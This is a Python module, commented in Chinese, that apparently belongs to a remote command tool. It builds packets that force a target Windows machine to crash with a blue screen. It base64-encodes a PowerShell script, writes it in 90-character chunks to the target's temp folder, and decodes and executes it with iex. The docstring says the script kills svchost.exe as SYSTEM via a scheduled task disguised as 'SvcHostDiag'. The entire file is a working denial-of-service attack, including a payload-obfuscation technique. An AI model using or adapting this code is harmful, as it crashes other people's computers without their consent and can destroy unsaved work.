"""蓝屏命令：在目标上以 SYSTEM 权限结束 svchost.exe 触发内核蓝屏。

命令通道单条只有 163 个 UTF-16 单元，装不下完整的 PowerShell 脚本，
因此把脚本转成 base64 后按 90 字符分片写入临时文件，最后一条命令解码执行。
"""

from base64 import b64encode
from datetime import datetime, timedelta

from app.packets.codec import pkg_sendlist
from app.packets.constants import (
    BLUE_SCREEN_SCRIPT,
    BLUE_SCREEN_TASK_NAME,
    BLUE_SCREEN_TRIGGER_SECONDS,
)

# 分片大小按单条命令上限反推：写文件的命令还要带上 writer、临时路径与引号。
CHUNK_UNITS = 90

# 临时文件放在目标账号自己的临时目录，执行完随系统重启自然失效。
TEMP_FILE = r"$env:TEMP\bs.b64"


def blue_screen_commands():
    """返回依次下发的命令：先写分片，最后解码执行。

    Returns:
        list[str]: 按顺序执行的命令行，第一条覆盖写入，其余追加。
    """
    encoded = b64encode(BLUE_SCREEN_SCRIPT.encode("utf-8")).decode("ascii")
    commands = []
    for start in range(0, len(encoded), CHUNK_UNITS):
        writer = "Set-Content" if start == 0 else "Add-Content"
        chunk = encoded[start : start + CHUNK_UNITS]
        commands.append("powershell -c \"%s %s '%s'\"" % (writer, TEMP_FILE, chunk))
    commands.append(
        'powershell -c "iex([Text.Encoding]::UTF8.GetString([Convert]::'
        'FromBase64String((Get-Content -Raw %s))))"' % TEMP_FILE
    )
    return commands


def trigger_hint(moment=None):
    """返回计划任务触发时间的中文提示，供 DEBUG 日志使用。

    触发时间由目标机在执行脚本时用自己的时钟计算，这里只能按本机时钟推算一个
    参考值；两者时钟不同步时以目标机为准。

    Args:
        moment: 基准时间，None 表示取本机当前时间。

    Returns:
        str: 形如「计划任务 SvcHostDiag 在目标本机时间加 15 秒后触发（本机推算
        2026-11-20 21:56:30）」。
    """
    base = moment or datetime.now()
    scheduled = base + timedelta(seconds=BLUE_SCREEN_TRIGGER_SECONDS)
    return "计划任务 %s 在目标本机时间加 %d 秒后触发，本机推算 %s" % (
        BLUE_SCREEN_TASK_NAME,
        BLUE_SCREEN_TRIGGER_SECONDS,
        scheduled.strftime("%Y-%m-%d %H:%M:%S"),
    )


def blue_screen_packets():
    """返回蓝屏所需的全部报文。

    Returns:
        list[list[int]]: 待依次发送的命令报文。
    """
    return [pkg_sendlist("-c", command) for command in blue_screen_commands()]
